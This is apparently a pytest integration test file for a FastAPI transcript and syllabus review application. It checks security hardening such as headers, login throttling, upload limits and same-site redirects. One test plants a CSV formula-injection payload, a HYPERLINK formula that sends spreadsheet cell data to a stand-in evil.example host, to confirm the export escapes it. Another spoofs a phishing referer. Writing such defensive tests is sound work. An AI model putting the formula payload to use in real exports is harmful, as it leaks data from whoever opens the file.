"""보안 강화: 응답 보안 헤더, 같은 IP의 로그인 실패 제한, 하루 업로드 횟수, CSV 수식 주입 방지,
이전 화면 돌아가기는 같은 사이트만, 판정 전 건만 일괄 배정."""

from fastapi.testclient import TestClient
from sqlalchemy.orm import Session

from backend.services import student as student_service
from tests.conftest import csrf_of, login, send_transcript
from tests.integration.test_pipeline import latest, new_request, upload


def test_every_response_has_security_headers(client: TestClient, seeded: Session) -> None:
    r = client.get("/login")
    assert r.headers["X-Frame-Options"] == "DENY"
    assert "frame-ancestors 'none'" in r.headers["Content-Security-Policy"]
    assert r.headers["X-Content-Type-Options"] == "nosniff"
    assert r.headers["Referrer-Policy"] == "strict-origin-when-cross-origin"


def test_many_failed_logins_from_one_ip_are_blocked(client: TestClient, seeded: Session) -> None:
    from backend.security.throttle import LOGIN_FAILURES

    token = csrf_of(client)
    for i in range(LOGIN_FAILURES.limit):  # 없는 계정이라 계정 잠금과 상관없이 IP만 센다
        client.post("/login", data={"email": f"nobody{i}@x.example", "password": "wrong", "csrf_token": token})
    r = client.post("/login", data={"email": "jiwon@student.example", "password": "demo1234", "csrf_token": token})
    assert r.status_code == 429 and "로그인 시도가 너무 많아요" in r.text  # 맞는 비밀번호라도 잠시 막는다
    LOGIN_FAILURES.clear()
    login(client, "jiwon@student.example")


def test_daily_upload_limit(client: TestClient, seeded: Session, monkeypatch) -> None:  # type: ignore[no-untyped-def]
    monkeypatch.setitem(student_service.DAILY_UPLOAD_LIMITS, "transcript.upload", 2)
    token = login(client, "jiwon@student.example")
    transcript = "Hankuk University Transcript\nMATH 101 | Calculus I | 3 | A\n"
    assert send_transcript(client, token, transcript).status_code == 303
    assert send_transcript(client, token, transcript).headers["location"] == "/student/transcript"
    send_transcript(client, token, transcript)  # 세 번째는 거절
    page = client.get("/student/transcript").text
    assert "하루에 올릴 수 있는 횟수(2건)를 넘었어요" in page


def test_csv_export_escapes_formulas(client: TestClient, seeded: Session) -> None:
    from backend.models import Syllabus
    from tests.integration.test_review_extras import approve
    from tests.integration.test_workflow import professor_for

    ev, _, token = professor_for(client, seeded, "calculus.txt")
    approve(client, ev, token)
    syllabus = seeded.get(Syllabus, ev.syllabus_id)
    assert syllabus is not None
    syllabus.course_code = '=HYPERLINK("https://evil.example/?"&C2,"x")'
    seeded.commit()
    login(client, "rachel@msu.example")
    r = client.get("/review/export.csv")
    assert "'=HYPERLINK" in r.text and r.headers["Cache-Control"] == "no-store"


def test_back_redirect_stays_on_site(client: TestClient, seeded: Session) -> None:
    token = login(client, "jiwon@student.example")
    rid = new_request(client, seeded, token)
    upload(client, rid, token, "calculus.txt")
    syllabus_id = latest(seeded, "calculus.txt", rid).syllabus_id
    r = client.post(
        f"/student/syllabi/{syllabus_id}/supplement",
        files={"file": ("x.exe", b"MZ", "application/octet-stream")},
        data={"csrf_token": token},
        headers={"referer": "https://evil.example/phish"},
        follow_redirects=False,
    )
    assert r.status_code == 303 and r.headers["location"] == "/student"


def test_auto_assign_skips_drafts(client: TestClient, seeded: Session) -> None:
    from backend.repositories import evaluations as evaluation_repo

    token = login(client, "jiwon@student.example")
    rid = new_request(client, seeded, token)
    upload(client, rid, token, "calculus.txt")  # 심사 요청 전(초안)
    draft = latest(seeded, "calculus.txt", rid)
    token = login(client, "rachel@msu.example")
    client.post("/review/assign", data={"evaluation_ids": [draft.id], "csrf_token": token})
    assert evaluation_repo.active_assignment(seeded, draft.id) is None
